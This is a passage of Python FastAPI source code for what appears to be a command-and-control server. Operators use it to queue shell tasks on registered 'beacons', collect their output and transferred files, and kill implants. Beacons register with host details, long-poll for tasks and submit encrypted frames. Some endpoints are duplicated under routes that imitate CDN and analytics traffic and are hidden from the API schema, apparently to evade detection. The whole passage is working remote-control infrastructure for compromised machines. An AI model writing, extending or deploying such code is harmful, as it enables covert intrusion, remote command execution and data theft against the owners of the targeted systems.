        return FileTransferResponse(**public_file_transfer(transfer))

    @api_router.get("/file-transfers/{transfer_id}/artifact", response_model=None, tags=["file-transfers"])
    def download_file_transfer_artifact(
        transfer_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        try:
            transfer, artifact, content = download_transfer_artifact(
                session,
                settings,
                transfer_id,
                actor_subject=actor_subject,
            )
        except ArtifactNotFound as exc:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="File transfer artifact not found",
            ) from exc
        except FileTransferError as exc:
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail=str(exc)) from exc
        filename = artifact.filename or transfer.filename
        return Response(
            content=content,
            media_type=artifact.content_type,
            headers={
                "Content-Disposition": f'attachment; filename="{filename}"',
                "Content-Length": str(len(content)),
                "X-Content-Type-Options": "nosniff",
            },
        )

    @api_router.post("/tasks", response_model=TaskResponse, tags=["tasks"])
    async def create_task(
        payload: TaskCreateRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        try:
            beacon_id = uuid.UUID(payload.beacon_id)
        except ValueError as exc:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_id must be a UUID",
            ) from exc
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        ensure_beacon_active(beacon)

        args = validate_task_timeout(settings, payload.args)
        task = Task(
            beacon_id=beacon_id,
            module=payload.module,
            args=args,
            priority=payload.priority,
            status=TASK_STATUS_QUEUED,
            queued_at=utc_now(),
        )
        session.add(task)
        session.flush()
        record_task_audit_event(
            session,
            task,
            actor_subject=actor_subject,
            event_type="task.queued",
            message="Operator queued shell task.",
        )
        try:
            await request.app.state.task_queue_service.enqueue(getattr(request.app.state, "redis_client", None), task)
        except TaskQueueUnavailable:
            session.rollback()
            raise task_queue_unavailable_exception() from None
        session.commit()
        session.refresh(task)

        task_payload = public_task(task)
        await publish_task_event(request.app, settings, "task.queued", task_payload)

        delivered = await build_next_longpoll_task_frame(request.app, settings, beacon_id)
        if delivered is not None:
            frame, dispatched_task_payload = delivered
            if await request.app.state.beacon_longpoll_manager.deliver_frame(beacon_id, frame):
                await publish_task_event(request.app, settings, "task.dispatched", dispatched_task_payload)

        return TaskResponse(**task_payload)

    @api_router.get("/tasks", response_model=TaskListResponse, tags=["tasks"])
    def list_tasks(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        beacon_id: Annotated[uuid.UUID | None, Query()] = None,
        command: Annotated[str | None, Query(min_length=1, max_length=256)] = None,
        status_filter: Annotated[TaskStatus | None, Query(alias="status")] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 50,
    ) -> TaskListResponse:
        authorize_c2_token(settings, authorization)
        query = select(Task).order_by(Task.created_at.desc())
        if beacon_id is not None:
            query = query.where(Task.beacon_id == beacon_id)
        if command is not None:
            query = query.where(cast(Task.args["command"].as_string(), String).ilike(f"%{command.strip()}%"))
        if status_filter is not None:
            query = query.where(Task.status == status_filter)
        query = query.limit(limit)
        tasks = session.execute(query).scalars().all()
        return TaskListResponse(items=[TaskResponse(**public_task(task)) for task in tasks])

    @api_router.get("/tasks/{task_id}", response_model=TaskResponse, tags=["tasks"])
    def get_task(
        task_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResponse:
        authorize_c2_token(settings, authorization)
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        return TaskResponse(**public_task(task))

    @api_router.get("/tasks/{task_id}/audit", response_model=TaskAuditEventListResponse, tags=["tasks"])
    def list_task_audit_events(
        task_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 50,
    ) -> TaskAuditEventListResponse:
        authorize_c2_token(settings, authorization)
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        events = (
            session.execute(
                select(TaskAuditEvent)
                .where(TaskAuditEvent.task_id == task_id)
                .order_by(TaskAuditEvent.occurred_at.desc(), TaskAuditEvent.created_at.desc())
                .limit(limit)
            )
            .scalars()
            .all()
        )
        return TaskAuditEventListResponse(
            items=[TaskAuditEventResponse(**public_task_audit_event(event)) for event in events]
        )

    @api_router.get("/task-results", response_model=TaskResultListResponse, tags=["tasks"])
    def list_task_results(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        beacon_id: Annotated[uuid.UUID | None, Query()] = None,
        status_filter: Annotated[str | None, Query(alias="status", pattern="^(completed|failed)$")] = None,
        cursor: Annotated[datetime | None, Query()] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 50,
    ) -> TaskResultListResponse:
        authorize_c2_token(settings, authorization)
        query = (
            select(TaskResult)
            .where(TaskResult.completed_at.is_not(None))
            .order_by(TaskResult.completed_at.desc(), TaskResult.created_at.desc())
        )
        if beacon_id is not None:
            query = query.where(TaskResult.beacon_id == beacon_id)
        if status_filter is not None:
            query = query.where(TaskResult.status == status_filter)
        if cursor is not None:
            query = query.where(TaskResult.completed_at < cursor)
        results = session.execute(query.limit(limit + 1)).scalars().all()
        page = results[:limit]
        next_cursor = page[-1].completed_at if len(results) > limit and page else None
        return TaskResultListResponse(
            items=[
                TaskResultResponse(**public_task_result(session, settings, result, include_output=False))
                for result in page
            ],
            next_cursor=next_cursor,
        )

    def task_result_for_task(session: Session, task_id: uuid.UUID) -> TaskResult:
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        result = session.execute(select(TaskResult).where(TaskResult.task_id == task_id)).scalar_one_or_none()
        if result is None or result.completed_at is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task result not found")
        return result

    @api_router.get("/tasks/{task_id}/result", response_model=TaskResultResponse, tags=["tasks"])
    def get_task_result(
        task_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResultResponse:
        authorize_c2_token(settings, authorization)
        result = task_result_for_task(session, task_id)
        try:
            payload = public_task_result(
                session,
                settings,
                result,
                include_output=True,
                include_availability=True,
            )
        except ArtifactNotFound as exc:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task result artifact not found") from exc
        return TaskResultResponse(**payload)

    @api_router.get(
        "/tasks/{task_id}/result/chunks",
        response_model=TaskResultChunkListResponse,
        tags=["tasks"],
    )
    def list_task_result_chunks(
        task_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        stream: Annotated[str | None, Query(pattern="^(stdout|stderr)$")] = None,
        upload_id: Annotated[str | None, Query(max_length=128)] = None,
        after_sequence: Annotated[int | None, Query(ge=-1)] = None,
        limit: Annotated[int, Query(ge=1, le=500)] = 250,
    ) -> TaskResultChunkListResponse:
        authorize_c2_token(settings, authorization)
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        query = select(ResultChunk).where(ResultChunk.task_id == task_id)
        if stream is not None:
            query = query.where(ResultChunk.stream == stream)
        if upload_id is not None:
            query = query.where(ResultChunk.upload_id == upload_id)
        if after_sequence is not None:
            query = query.where(ResultChunk.sequence > after_sequence)
        chunks = (
            session.execute(
                query.order_by(
                    ResultChunk.stream.asc(),
                    ResultChunk.upload_id.asc(),
                    ResultChunk.sequence.asc(),
                ).limit(limit)
            )
            .scalars()
            .all()
        )
        return TaskResultChunkListResponse(
            items=[TaskResultChunkResponse(**public_task_result_chunk(chunk)) for chunk in chunks]
        )

    @api_router.get("/tasks/{task_id}/result/download", response_model=None, tags=["tasks"])
    def download_task_result_text(
        task_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        stream: Annotated[str, Query(pattern="^(combined|stdout|stderr)$")] = "combined",
    ) -> Response:
        authorize_c2_token(settings, authorization)
        result = task_result_for_task(session, task_id)
        try:
            content, filename = download_text_for_result(session, settings, result, stream)
        except ArtifactNotFound as exc:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task result artifact not found") from exc
        encoded = content.encode("utf-8")
        return Response(
            content=encoded,
            media_type="text/plain; charset=utf-8",
            headers={
                "Content-Disposition": f'attachment; filename="{filename}"',
                "Content-Length": str(len(encoded)),
                "X-Content-Type-Options": "nosniff",
            },
        )

    @api_router.get("/tasks/{task_id}/result/artifacts/{artifact_id}", response_model=None, tags=["tasks"])
    def download_task_result_artifact(
        task_id: uuid.UUID,
        artifact_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response:
        authorize_c2_token(settings, authorization)
        result = task_result_for_task(session, task_id)
        artifact = (
            session.execute(
                select(Artifact)
                .join(TaskResultArtifact, TaskResultArtifact.artifact_id == Artifact.id)
                .where(TaskResultArtifact.task_result_id == result.id, Artifact.id == artifact_id)
            )
            .scalars()
            .one_or_none()
        )
        if artifact is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task result artifact not found")
        try:
            content = read_artifact(settings, artifact)
        except ArtifactNotFound as exc:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task result artifact not found") from exc
        return Response(
            content=content,
            media_type=artifact.content_type,
            headers={
                "Content-Disposition": f'attachment; filename="{artifact.filename}"',
                "Content-Length": str(len(content)),
                "X-Content-Type-Options": "nosniff",
            },
        )

    @api_router.delete("/tasks/{task_id}", response_model=TaskResponse, tags=["tasks"])
    async def delete_task(
        task_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        task = await cancel_task(
            session,
            request.app.state.task_queue_service,
            getattr(request.app.state, "redis_client", None),
            task,
            actor_subject=actor_subject,
        )
        session.commit()
        session.refresh(task)
        task_payload = public_task(task)
        await publish_task_event(request.app, settings, "task.cancelled", task_payload)
        return TaskResponse(**task_payload)

    @api_router.post("/beacons/register", response_model=BeaconRegistrationResponse, tags=["beacons"])
    async def register_beacon(
        payload: BeaconRegistrationRequest,
        request: Request,
        session: DbSession,
    ) -> BeaconRegistrationResponse:
        now = utc_now()
        beacon_token = generate_beacon_token()
        beacon_token_hash = hash_beacon_token(beacon_token)
        beacon = session.execute(
            select(Beacon).where(Beacon.machine_fingerprint_hash == payload.machine_fingerprint_hash)
        ).scalar_one_or_none()
        created = beacon is None
        if beacon is None:
            beacon = Beacon(
                machine_fingerprint_hash=payload.machine_fingerprint_hash,
                hostname=payload.hostname,
                os=payload.os,
                architecture=payload.architecture,
                internal_ip=payload.internal_ip,
                external_ip=payload.external_ip,
                pid=payload.pid,
                status=BEACON_STATUS_ONLINE,
                sleep_seconds=settings.beacon_default_sleep_seconds,
                jitter=settings.beacon_default_jitter,
                beacon_token_hash=beacon_token_hash,
                beacon_token_issued_at=now,
                transport_mode="rest",
                transport_connected=False,
                transport_last_seen=now,
                first_seen=now,
                last_seen=now,
            )
        else:
            ensure_beacon_active(beacon)
            old_status = beacon.status
            beacon.hostname = payload.hostname
            beacon.os = payload.os
            beacon.architecture = payload.architecture
            beacon.internal_ip = payload.internal_ip
            beacon.external_ip = payload.external_ip
            beacon.pid = payload.pid
            beacon.status = BEACON_STATUS_ONLINE
            beacon.beacon_token_hash = beacon_token_hash
            beacon.beacon_token_issued_at = now
            beacon.transport_mode = "rest"
            beacon.transport_connected = False
            beacon.transport_last_seen = now
            beacon.last_seen = now
            record_status_transition(
                session,
                beacon,
                old_status=old_status,
                new_status=BEACON_STATUS_ONLINE,
                reason=BEACON_EVENT_REASON_HEARTBEAT,
                occurred_at=now,
            )

        session.add(beacon)
        session.flush()
        profile_fields = profile_ack_fields(session, settings, beacon)
        session.commit()
        session.refresh(beacon)

        beacon_payload = public_beacon(beacon)
        redis_client = get_redis_client(request)
        event = await publish_operator_event(
            redis_client,
            settings,
            "beacon.registered" if created else "beacon.status.changed",
            data={"beacon": beacon_payload},
            scope={"beacon_id": str(beacon.id)},
        )
        if redis_client is None:
            await request.app.state.operator_realtime_hub.broadcast(event)
        return BeaconRegistrationResponse(
            beacon_id=str(beacon.id),
            beacon_token=beacon_token,
            status=beacon.status,
            sleep=profile_fields["sleep"],
            jitter=profile_fields["jitter"],
            profile=profile_fields["profile"],
            beacon=BeaconResponse(**beacon_payload),
        )

    app.add_api_route(
        "/cdn-cgi/xero/register",
        register_beacon,
        methods=["POST"],
        response_model=BeaconRegistrationResponse,
        include_in_schema=False,
    )
    app.add_api_route(
        "/g/collect/register",
        register_beacon,
        methods=["POST"],
        response_model=BeaconRegistrationResponse,
        include_in_schema=False,
    )

    @api_router.post("/beacons/{beacon_id}/heartbeat", response_model=BeaconHeartbeatResponse, tags=["beacons"])
    async def heartbeat_beacon(
        beacon_id: uuid.UUID,
        payload: BeaconHeartbeatRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconHeartbeatResponse:
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")

        if not verify_beacon_token(bearer_token(authorization), beacon.beacon_token_hash):
            raise beacon_auth_exception()
        ensure_beacon_active(beacon)

        now = utc_now()
        old_status = beacon.status
        apply_runtime_metadata(beacon, payload)
        beacon.status = BEACON_STATUS_ONLINE
        beacon.transport_mode = "rest"
        beacon.transport_connected = False
        beacon.transport_last_seen = now
        beacon.last_seen = now
        record_status_transition(
            session,
            beacon,
            old_status=old_status,
            new_status=BEACON_STATUS_ONLINE,
            reason=BEACON_EVENT_REASON_HEARTBEAT,
            occurred_at=now,
        )
        session.add(beacon)
        session.flush()
        profile_fields = profile_ack_fields(session, settings, beacon)
        session.commit()
        session.refresh(beacon)

        beacon_payload = public_beacon(beacon)
        if old_status != BEACON_STATUS_ONLINE:
            await publish_beacon_event(request.app, settings, "beacon.status.changed", beacon_payload)
        await publish_beacon_event(request.app, settings, "beacon.heartbeat", beacon_payload)
        return BeaconHeartbeatResponse(
            status=beacon.status,
            sleep=profile_fields["sleep"],
            jitter=profile_fields["jitter"],
            profile=profile_fields["profile"],
            beacon=BeaconResponse(**beacon_payload),
        )

    @api_router.put("/beacons/{beacon_id}/profile", response_model=BeaconResponse, tags=["beacons"])
    async def assign_beacon_profile(
        beacon_id: uuid.UUID,
        payload: TrafficProfileAssignRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconResponse:
        authorize_c2_token(settings, authorization)
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        ensure_beacon_active(beacon)
        profile = None
        if payload.profile_id is not None:
            profile = find_profile(session, payload.profile_id)
            if profile is None:
                raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        try:
            assign_profile_to_beacon(session, beacon, profile)
            session.commit()
            session.refresh(beacon)
        except ValueError as exc:
            session.rollback()
            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
        beacon_payload = public_beacon(beacon)
        await publish_beacon_event(request.app, settings, "beacon.profile.changed", beacon_payload)
        return BeaconResponse(**beacon_payload)

    @api_router.delete("/beacons/{beacon_id}/profile", response_model=BeaconResponse, tags=["beacons"])
    async def clear_beacon_profile(
        beacon_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconResponse:
        authorize_c2_token(settings, authorization)
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        ensure_beacon_active(beacon)
        assign_profile_to_beacon(session, beacon, None)
        session.commit()
        session.refresh(beacon)
        beacon_payload = public_beacon(beacon)
        await publish_beacon_event(request.app, settings, "beacon.profile.changed", beacon_payload)
        return BeaconResponse(**beacon_payload)

    @api_router.get("/beacons/{beacon_id}/poll", response_model=None, tags=["beacons"])
    async def poll_beacon(
        beacon_id: uuid.UUID,
        request: Request,
        authorization: Annotated[str | None, Header()] = None,
        timeout_seconds: Annotated[int | None, Query(ge=1)] = None,
    ) -> Response:
        SessionFactory = session_factory_for_settings(settings)
        with SessionFactory() as session:
            beacon = session.get(Beacon, beacon_id)
            if beacon is None:
                raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
            if not verify_beacon_token(bearer_token(authorization), beacon.beacon_token_hash):
                raise beacon_auth_exception()
            ensure_beacon_active(beacon)

        manager: BeaconLongPollManager = request.app.state.beacon_longpoll_manager
        try:
            poll = await manager.register(beacon_id)
        except DuplicateLongPollError as exc:
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail=str(exc)) from exc

        with SessionFactory() as session:
            beacon = update_beacon_longpoll_state(session, beacon_id, connected=True)
            session.commit()
            beacon_payload = public_beacon(beacon) if beacon is not None else None
        if beacon_payload is not None:
            await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)

        queued_task_frame = await build_next_longpoll_task_frame(request.app, settings, beacon_id)
        if queued_task_frame is not None:
            frame, task_payload = queued_task_frame
            await publish_task_event(request.app, settings, "task.dispatched", task_payload)
            await manager.unregister(beacon_id, poll.id)
            with SessionFactory() as session:
                beacon = update_beacon_longpoll_state(session, beacon_id, connected=False)
                session.commit()
                beacon_payload = public_beacon(beacon) if beacon is not None else None
            if beacon_payload is not None:
                await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)

            return Response(content=frame, media_type="application/octet-stream")

        configured_timeout = settings.beacon_longpoll_timeout_seconds
        effective_timeout = (
            min(configured_timeout, timeout_seconds) if timeout_seconds is not None else configured_timeout
        )
        try:
            task_frame = await manager.wait_for_frame(beacon_id, poll.id, timeout_seconds=effective_timeout)
            if task_frame is None:
                return Response(status_code=status.HTTP_204_NO_CONTENT)
            return Response(content=task_frame, media_type="application/octet-stream")
        finally:
            removed = await manager.unregister(beacon_id, poll.id)
            if removed:
                with SessionFactory() as session:
                    beacon = update_beacon_longpoll_state(session, beacon_id, connected=False)
                    session.commit()
                    beacon_payload = public_beacon(beacon) if beacon is not None else None
                if beacon_payload is not None:
                    await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)

    app.add_api_route(
        "/cdn-cgi/xero/{beacon_id}/collect",
        poll_beacon,
        methods=["GET"],
        response_model=None,
        include_in_schema=False,
    )
    app.add_api_route(
        "/g/collect/{beacon_id}",
        poll_beacon,
        methods=["GET"],
        response_model=None,
        include_in_schema=False,
    )

    @api_router.post("/beacons/{beacon_id}/frame", response_model=None, tags=["beacons"])
    async def submit_beacon_frame(
        beacon_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response | JSONResponse:
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        if not verify_beacon_token(bearer_token(authorization), beacon.beacon_token_hash):
            raise beacon_auth_exception()
        ensure_beacon_active(beacon)

        raw_frame = await request.body()
        metadata = frame_metadata(raw_frame)
        decoded = None
        try:
            if len(raw_frame) > settings.beacon_longpoll_max_frame_bytes:
                raise ProtocolError(
                    "FRAME_TOO_LARGE",
                    "HTTP long-poll frame exceeds configured maximum",
                    status_code=status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
                )
            ensure_nonce_not_replayed(session, metadata)
            decoded = decode_frame(
                raw_frame,
                private_key=c2_protocol_private_key(settings),
                supported_versions=protocol_supported_versions(settings),
                max_frame_bytes=min(settings.protocol_max_frame_bytes, settings.beacon_longpoll_max_frame_bytes),
            )
            validate_longpoll_frame_beacon(decoded, beacon_id)
            active_poll = request.app.state.beacon_longpoll_manager.is_active(beacon_id)
            processed_beacon_id, ack_payload = process_protocol_frame(
                session,
                settings,
                decoded,
                transport_mode="long-poll",
                transport_connected=active_poll,
            )
            dispatched_task_payload = None
            if decoded.message_type == TASK_POLL:
                dispatched_task_payload = await attach_dispatched_task_to_ack(
                    request.app,
                    session,
                    settings,
                    beacon_id=processed_beacon_id,
                    ack_payload=ack_payload,
                )
            session_data_outcome = None
            if decoded.message_type == SESSION_DATA and processed_beacon_id is not None:
                session_data_outcome = apply_beacon_session_data(
                    session,
                    beacon_id=processed_beacon_id,
                    payload=decoded.payload,
                    settings=settings,
                )
            record_frame_receipt(session, decoded, beacon_id=processed_beacon_id)
            session.commit()

            if processed_beacon_id is not None:
                beacon = session.get(Beacon, processed_beacon_id)
                if beacon is not None:
                    beacon_payload = public_beacon(beacon)
                    await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)
                    if decoded.message_type == HEARTBEAT:
                        await publish_beacon_event(request.app, settings, "beacon.heartbeat", beacon_payload)
            if dispatched_task_payload is not None:
                await publish_task_event(request.app, settings, "task.dispatched", dispatched_task_payload)
            if ack_payload.get("task_event_type") and isinstance(ack_payload.get("task"), dict):
                await publish_task_event(
                    request.app,
                    settings,
                    str(ack_payload["task_event_type"]),
                    ack_payload["task"],
                )
            if ack_payload.get("task_result_chunk_event_type") and isinstance(
                ack_payload.get("task_result_chunk"), dict
            ):
                await publish_task_result_chunk_event(
                    request.app,
                    settings,
                    str(ack_payload["task_result_chunk_event_type"]),
                    ack_payload["task_result_chunk"],
                )
            if ack_payload.get("task_result_event_type") and isinstance(ack_payload.get("task_result"), dict):
                await publish_task_result_event(
                    request.app,
                    settings,
                    str(ack_payload["task_result_event_type"]),
                    ack_payload["task_result"],
                )
            if session_data_outcome is not None:
                if session_data_outcome.cache_listing is not None:
                    await request.app.state.session_file_cache.store(
                        session_data_outcome.session_id,
                        session_data_outcome.cache_listing,
                    )
                if session_data_outcome.operator_message is not None:
                    await request.app.state.session_relay_manager.deliver(
                        session_data_outcome.session_id,
                        session_data_outcome.operator_message,
                    )
                if session_data_outcome.event_type is not None:
                    await publish_session_payload_event(
                        request.app,
                        settings,
                        session_data_outcome.event_type,
                        session_data_outcome.session_payload,
                    )
            return encrypted_protocol_response(settings, decoded, ACK, ack_payload)
        except ProtocolError as exc:
            session.rollback()
            record_protocol_error(session, exc, metadata, beacon_id=beacon_id)
            session.commit()
            if decoded is not None:
                return encrypted_protocol_error_response(settings, decoded, exc)
            return protocol_error_response(exc)
        except TaskQueueUnavailable:
            session.rollback()
            raise task_queue_unavailable_exception() from None

    app.add_api_route(
        "/cdn-cgi/xero/{beacon_id}/frame",
        submit_beacon_frame,
        methods=["POST"],
        response_model=None,
        include_in_schema=False,
    )
    app.add_api_route(
        "/g/collect/{beacon_id}/frame",
        submit_beacon_frame,
        methods=["POST"],
        response_model=None,
        include_in_schema=False,
    )

    @api_router.get("/beacons", response_model=BeaconListResponse, tags=["beacons"])
    def list_beacons(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        include_removed: Annotated[bool, Query()] = False,
        status_filter: Annotated[str | None, Query(alias="status", pattern="^(online|offline)$")] = None,
    ) -> BeaconListResponse:
        authorize_c2_token(settings, authorization)
        query = select(Beacon).order_by(Beacon.last_seen.desc())
        if not include_removed:
            query = query.where(Beacon.removed_at.is_(None))
        if status_filter is not None:
            query = query.where(Beacon.status == status_filter)
        beacons = session.execute(query).scalars().all()
        return BeaconListResponse(items=[BeaconResponse(**public_beacon(beacon)) for beacon in beacons])

    @api_router.post("/beacons/{beacon_id}/kill", response_model=BeaconKillResponse, tags=["beacons"])
    async def kill_beacon(
        beacon_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconKillResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")

        already_removed = beacon.removed_at is not None
        now = utc_now()
        if not already_removed:
            old_status = beacon.status
            beacon.status = BEACON_STATUS_OFFLINE
            beacon.transport_connected = False
            beacon.transport_last_seen = now
            beacon.removed_at = now
            beacon.removed_by = actor_subject
            beacon.removed_reason = "operator"
            record_status_transition(
                session,
                beacon,
                old_status=old_status,
                new_status=BEACON_STATUS_OFFLINE,
                reason="operator-killed",
                occurred_at=now,
            )
            session.add(beacon)

        active_sessions = (
            session.execute(
                select(InteractiveSession)
                .where(
                    InteractiveSession.beacon_id == beacon.id,
                    InteractiveSession.status.in_(ACTIVE_SESSION_STATUSES),
                )
                .order_by(InteractiveSession.updated_at.desc())
            )
            .scalars()
            .all()
        )
        closed_session_payloads = []
        for shell_session in active_sessions:
            session_payload = await close_interactive_session_for_operator(
                request.app,
                settings,
                session,
                shell_session,
                reason="beacon_killed",
            )
            if session_payload is not None:
                closed_session_payloads.append(session_payload)

        queued_tasks = (
            session.execute(
                select(Task)
                .where(Task.beacon_id == beacon.id, Task.status == TASK_STATUS_QUEUED)
                .order_by(Task.queued_at.desc())
            )
            .scalars()
            .all()
        )
        cancelled_task_payloads = []
        for task in queued_tasks:
            cancelled = await cancel_task(
                session,
                request.app.state.task_queue_service,
                getattr(request.app.state, "redis_client", None),
                task,
                actor_subject=actor_subject,
            )
            cancelled_task_payloads.append(public_task(cancelled))

        session.commit()
        session.refresh(beacon)
        beacon_payload = public_beacon(beacon)

        await request.app.state.beacon_transport_manager.close_beacon(beacon.id)
        await request.app.state.beacon_longpoll_manager.close_beacon(beacon.id)
        for session_payload in closed_session_payloads:
            await publish_closed_session_payload(request.app, settings, session_payload)
        for task_payload in cancelled_task_payloads:
            await publish_task_event(request.app, settings, "task.cancelled", task_payload)
        await publish_beacon_event(request.app, settings, "beacon.killed", beacon_payload)

        return BeaconKillResponse(
            beacon=BeaconResponse(**beacon_payload),
            cancelled_tasks=len(cancelled_task_payloads),
            closed_sessions=len(closed_session_payloads),
            status="already_removed" if already_removed else "removed",
        )

    @api_router.get("/beacons/{beacon_id}/activity", response_model=BeaconActivityListResponse, tags=["beacons"])
    def list_beacon_activity(
        beacon_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        limit: Annotated[int, Query(ge=1, le=50)] = 20,
    ) -> BeaconActivityListResponse:
        authorize_c2_token(settings, authorization)
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        items = beacon_activity_items(session, beacon, limit=limit)
        return BeaconActivityListResponse(items=[BeaconActivityItemResponse(**item) for item in items])

    @api_router.get("/beacons/{beacon_id}", response_model=BeaconResponse, tags=["beacons"])
    def get_beacon(
        beacon_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        include_removed: Annotated[bool, Query()] = False,
    ) -> BeaconResponse:
        authorize_c2_token(settings, authorization)
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        if beacon.removed_at is not None and not include_removed:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        return BeaconResponse(**public_beacon(beacon))

    app.include_router(api_router)
    return app


app = create_app()
